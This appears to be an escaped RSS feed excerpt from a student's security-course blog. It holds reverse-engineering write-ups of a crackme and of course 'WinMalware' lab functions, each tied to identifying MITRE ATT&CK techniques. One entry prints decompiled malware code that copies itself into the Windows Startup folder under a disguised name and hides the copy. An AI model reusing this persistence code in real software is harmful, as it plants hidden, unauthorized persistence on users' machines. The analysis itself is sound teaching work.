&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">let a = MEM[RSP+0x0:RSP+0x4]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">let b = MEM[RSP+0x4:RSP+0x8]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">let c = MEM[RSP+0x8:RSP+0xc]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">EAX = a + b
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">EBX = a - b
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">ECX = -c
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">EDX = 9*a + 7
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>a &lt;span style="color:#f92672">=&lt;/span> get_rand(&lt;span style="color:#ae81ff">4&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>b &lt;span style="color:#f92672">=&lt;/span> get_rand(&lt;span style="color:#ae81ff">4&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c &lt;span style="color:#f92672">=&lt;/span> get_rand(&lt;span style="color:#ae81ff">4&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>init_list &lt;span style="color:#f92672">=&lt;/span> [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (RSP_DEFAULT &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x0&lt;/span>, a, &lt;span style="color:#ae81ff">4&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (RSP_DEFAULT &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x4&lt;/span>, b, &lt;span style="color:#ae81ff">4&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (RSP_DEFAULT &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x8&lt;/span>, c, &lt;span style="color:#ae81ff">4&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ans_list &lt;span style="color:#f92672">=&lt;/span> [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;eax&amp;#34;&lt;/span>, add(a, b, &lt;span style="color:#ae81ff">4&lt;/span>)),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;ebx&amp;#34;&lt;/span>, sub(a, b, &lt;span style="color:#ae81ff">4&lt;/span>)),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;ecx&amp;#34;&lt;/span>, neg(c, &lt;span style="color:#ae81ff">4&lt;/span>)),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#e6db74">&amp;#34;edx&amp;#34;&lt;/span>, add(mul(a, &lt;span style="color:#ae81ff">9&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>), &lt;span style="color:#ae81ff">7&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>)),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> len(argv) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>C&lt;span style="color:#f92672">.&lt;/span>BLUE&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">[+]&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>C&lt;span style="color:#f92672">.&lt;/span>NC&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> Usage: python3 &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>__file__&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> &amp;lt;path_to_asm_file&amp;gt;&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(challenge_info)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit(&lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> code &lt;span style="color:#f92672">=&lt;/span> open(argv[&lt;span style="color:#ae81ff">1&lt;/span>], &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>read()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Checker(init_list, ans_list, code)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
:::spoiler data_movement.py&lt;/p></description></item><item><title>Simple Reverse - 0x15(2023 HW - crackme_vectorization)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x152023-hw---crackme_vectorization/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x152023-hw---crackme_vectorization/</guid><description>&lt;h1 id="simple-reverse---0x152023-hw---crackme_vectorization">
 Simple Reverse - 0x15(2023 HW - crackme_vectorization)
 &lt;a class="anchor" href="#simple-reverse---0x152023-hw---crackme_vectorization">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> a1, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a2, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&amp;#34;+&amp;#34; TO EXPAND]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> __isoc99_scanf(&lt;span style="color:#e6db74">&amp;#34;%d&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>user_input_len); &lt;span style="color:#75715e">// 長度為49
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> user_input_len_cp &lt;span style="color:#f92672">=&lt;/span> user_input_len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sqrt_length &lt;span style="color:#f92672">=&lt;/span> sqrt((&lt;span style="color:#66d9ef">double&lt;/span>)user_input_len); &lt;span style="color:#75715e">// 開根號後是7
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> sqrt_length_cp &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)sqrt_length;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( sqrt_length &lt;span style="color:#f92672">&amp;gt;&lt;/span> (&lt;span style="color:#66d9ef">double&lt;/span>)(&lt;span style="color:#66d9ef">int&lt;/span>)sqrt_length )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>sqrt_length_cp;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sqrt_len &lt;span style="color:#f92672">=&lt;/span> _mm_shuffle_epi32(_mm_cvtsi32_si128(sqrt_length_cp), &lt;span style="color:#ae81ff">224&lt;/span>).m128i_u64[&lt;span style="color:#ae81ff">0&lt;/span>];&lt;span style="color:#75715e">// 原本的shuffle num就是user input length的開根號結果
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> space &lt;span style="color:#f92672">=&lt;/span> (struc_1 &lt;span style="color:#f92672">*&lt;/span>)malloc(&lt;span style="color:#ae81ff">0x10uLL&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> space&lt;span style="color:#f92672">-&amp;gt;&lt;/span>sqrt_len &lt;span style="color:#f92672">=&lt;/span> sqrt_len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> size &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#f92672">*&lt;/span> sqrt_length_cp &lt;span style="color:#f92672">*&lt;/span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)sqrt_length_cp;&lt;span style="color:#75715e">// size是196
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> shuffle_space &lt;span style="color:#f92672">=&lt;/span> malloc(size);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> space&lt;span style="color:#f92672">-&amp;gt;&lt;/span>content_space &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)shuffle_space;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( user_input_len_cp &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> shuffle_space_cp &lt;span style="color:#f92672">=&lt;/span> shuffle_space;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> len &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0LL&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> __isoc99_scanf(&lt;span style="color:#e6db74">&amp;#34;%d&amp;#34;&lt;/span>, content);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> shuffle_space_cp[len&lt;span style="color:#f92672">++&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> content[&lt;span style="color:#ae81ff">0&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( user_input_len &lt;span style="color:#f92672">&amp;gt;&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)len ); &lt;span style="color:#75715e">// 要輸入東西49次
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( length &lt;span style="color:#f92672">==&lt;/span> sqrt_length_cp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (space_1 &lt;span style="color:#f92672">=&lt;/span> (struc_1 &lt;span style="color:#f92672">*&lt;/span>)malloc(&lt;span style="color:#ae81ff">0x10uLL&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> space_1&lt;span style="color:#f92672">-&amp;gt;&lt;/span>sqrt_len &lt;span style="color:#f92672">=&lt;/span> sqrt_len,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> shuffle_space_1 &lt;span style="color:#f92672">=&lt;/span> malloc(size),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> src &lt;span style="color:#f92672">=&lt;/span> cipher_flag,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> space_1&lt;span style="color:#f92672">-&amp;gt;&lt;/span>content_space &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)shuffle_space_1,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memcpy(shuffle_space_1, src, size),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> ugly_matrix_multiplication(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)space_1,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#66d9ef">__int64&lt;/span>)space), &lt;span style="color:#75715e">// guess_cipher的大小是196
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// 他會把我們輸入的東西和他原本的東西一起送到guess_encrypt的這個function中
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">!&lt;/span>memcmp((&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)result[&lt;span style="color:#ae81ff">1&lt;/span>], verify_key, size)) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Correct!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;:(&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0LL&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
:::spoiler IDA Ugly Function&lt;/p></description></item><item><title>Simple Reverse - 0x16(2023 Lab - WinMalware - sub_140001C80)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x162023-lab---winmalware---sub_140001c80/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x162023-lab---winmalware---sub_140001c80/</guid><description>&lt;h1 id="simple-reverse---0x162023-lab---winmalware---sub_140001c80">
 Simple Reverse - 0x16(2023 Lab - WinMalware - sub_140001C80)
 &lt;a class="anchor" href="#simple-reverse---0x162023-lab---winmalware---sub_140001c80">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>分析 eductf-lab.exe 中的 function sub_140001C80 在做什麼，並找出其行為所對應的 MITRE ATT&amp;amp;CK technique ID。
Flag format: FLAG{T1234.001}&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamea">GetModuleFileNameA&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-getusernamea">GetUserNameA&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-copyfilea">CopyFileA&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-setfileattributesa">SetFileAttributesA&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Main Function
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Sleep(&lt;span style="color:#ae81ff">0x1B7740u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001C80();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001030();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001120();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001BF0();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>sub_140001C80
:::spoiler IDA Source Code
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>DWORD &lt;span style="color:#a6e22e">sub_140001C80&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DWORD result; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> size_t v1; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD v2; &lt;span style="color:#75715e">// [rsp+20h] [rbp-258h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> CHAR &lt;span style="color:#f92672">*&lt;/span>lpNewFileName; &lt;span style="color:#75715e">// [rsp+28h] [rbp-250h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD pcbBuffer[&lt;span style="color:#ae81ff">4&lt;/span>]; &lt;span style="color:#75715e">// [rsp+30h] [rbp-248h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> CHAR Buffer[&lt;span style="color:#ae81ff">272&lt;/span>]; &lt;span style="color:#75715e">// [rsp+40h] [rbp-238h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> CHAR Filename[&lt;span style="color:#ae81ff">272&lt;/span>]; &lt;span style="color:#75715e">// [rsp+150h] [rbp-128h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> GetModuleFileNameA(&lt;span style="color:#ae81ff">0&lt;/span>i64, Filename, &lt;span style="color:#ae81ff">0x104u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v2 &lt;span style="color:#f92672">=&lt;/span> result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> GetUserNameA(Buffer, pcbBuffer);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v1 &lt;span style="color:#f92672">=&lt;/span> pcbBuffer[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> v2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( __CFADD__(pcbBuffer[&lt;span style="color:#ae81ff">0&lt;/span>], v2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lpNewFileName &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">const&lt;/span> CHAR &lt;span style="color:#f92672">*&lt;/span>)malloc(v1);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001350(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lpNewFileName,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v2 &lt;span style="color:#f92672">+&lt;/span> pcbBuffer[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;C:&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Users&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">AppData&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Roaming&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Microsoft&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Windows&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Start Menu&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Programs&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Startup&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">SecurityUpdateCheck.exe&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Buffer);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> CopyFileA(Filename, lpNewFileName, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> SetFileAttributesA(lpNewFileName, &lt;span style="color:#ae81ff">0x26u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA sub_14001C80(解析版)&lt;/p></description></item><item><title>Simple Reverse - 0x17(2023 Lab - WinMalware - sub_140001030)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x172023-lab---winmalware---sub_140001030/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x172023-lab---winmalware---sub_140001030/</guid><description>&lt;h1 id="simple-reverse---0x172023-lab---winmalware---sub_140001030">
 Simple Reverse - 0x17(2023 Lab - WinMalware - sub_140001030)
 &lt;a class="anchor" href="#simple-reverse---0x172023-lab---winmalware---sub_140001030">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>分析 eductf-lab.exe 中的 function sub_140001030 在做什麼，並找出其行為所對應的 MITRE ATT&amp;amp;CK technique ID。
Flag format: FLAG{T1234}&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/timezoneapi/nf-timezoneapi-systemtimetofiletime">SystemTimeToFileTime&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/synchapi/nf-synchapi-createwaitabletimerw">CreateWaitableTimerW&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/synchapi/nf-synchapi-setwaitabletimer">SetWaitableTimer&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject">WaitForSingleObject&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>sub_140001030
:::spoiler IDA Source Code
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">waitUntil20231118&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HANDLE Result; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HANDLE hTimer; &lt;span style="color:#75715e">// [rsp+30h] [rbp-38h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> SYSTEMTIME SystemTime; &lt;span style="color:#75715e">// [rsp+38h] [rbp-30h] BYREF
